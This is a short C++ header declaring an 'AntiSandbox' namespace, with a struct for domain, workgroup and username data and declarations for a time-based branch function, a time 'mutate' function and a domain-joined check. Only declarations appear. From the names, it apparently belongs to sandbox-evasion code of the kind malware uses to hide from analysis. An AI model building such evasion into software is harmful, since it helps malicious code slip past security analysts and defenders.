#pragma once
#include "includes.h"
struct SandboxInformation
{
	LPWSTR Domain, Workgroup, Username;
	int GLE;
};

namespace AntiSandbox {
	void* __fastcall timeRangeBranch(std::time_t time, void* caller, char* init_key);
	int mutate(std::time_t* time);
	bool isDomainJoined(SandboxInformation *si);
}

